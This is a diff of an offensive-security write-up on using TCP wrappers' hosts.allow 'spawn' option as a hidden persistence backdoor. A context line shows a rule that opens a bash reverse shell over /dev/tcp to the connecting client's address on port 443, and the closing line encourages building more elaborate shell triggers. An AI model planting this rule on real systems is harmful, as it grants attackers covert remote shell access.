@@ -2,27 +2,35 @@ Git hooks "backdoor"
 ======================
 
 **How it works**
+
 When a client request is received by a TCP wrapped service, it takes the following basic steps:
+
 1. References /etc/hosts.allow. — The TCP wrapped service sequentially parses the /etc/hosts.allow file and applies the first rule specified for that service. If it finds a matching rule, it allows the connection. If not, it moves on to step 2.
+
 2. References /etc/hosts.deny. — The TCP wrapped service sequentially parses the /etc/hosts.deny file. If it finds a matching rule is denies the connection. If not, access to the service is granted.
 
+
 **How it is parsed**
+
 ACCESS CONTROL RULES
+
 Each access control file consists of zero or more lines of text.  These lines are processed in order of appearance. The search terminates when a match is found.
+
 A newline character is ignored when it is preceded by a backslash character. This permits you to break up long lines so that they are easier to edit.
+
 Blank lines or lines that begin with a `#´ character are ignored. This permits you to insert comments and whitespace so that the tables are easier to read.
+
 All other lines should satisfy the following format, things between [] being optional:
+
 
 **Syntax**
 ```shell-session
 <daemon list>: <client list> [: <option>: <option>: ...]
-
 ```
-**Translating... we can:**
+**Translating...**
 
 ```shell-session
 <daemon_list>: <client list> [: <shell_command> ]
-
 ```
 
 **Video**
@@ -69,5 +77,5 @@ echo 'ALL: ALL: spawn (bash -c "/bin/bash -i >& /dev/tcp/"%a"/443 0>&1") & :allo
        Characters in % expansions that may confuse the shell are replaced by underscores.
 ```
 
-Hey you can use your imagination now and take advantage of EXPANSIONS and create more complex filters to trigger your shells! Keep evolving my friend!
+Hey! You can use your imagination now and take advantage of EXPANSIONS and create more complex filters to trigger your shells! Keep evolving my friend!
 
